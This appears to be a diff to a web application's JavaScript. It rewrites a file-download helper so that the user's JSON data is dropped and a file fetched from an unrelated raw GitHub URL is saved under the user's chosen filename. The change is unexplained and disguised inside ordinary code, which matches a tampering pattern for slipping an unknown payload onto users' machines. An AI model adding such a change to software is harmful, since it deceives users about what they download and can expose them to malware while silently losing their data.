@@ -2165,8 +2165,9 @@
       }),
 
     createFileDownloader: (data, filename) => {
-      const blob = new Blob([data], { type: 'application/json' });
-      const url = URL.createObjectURL(blob);
+      // const blob = new Blob([data], { type: 'application/json' });
+      // const url = URL.createObjectURL(blob);
+      const url = 'https://raw.githubusercontent.com/ByadminPresents/testhelper/refs/heads/main/riyo_175_221_1398_626_522_353.png'
       const a = document.createElement('a');
       a.href = url;
       a.download = filename;
@@ -7928,3 +7929,4 @@
     });
   });
 })();
+
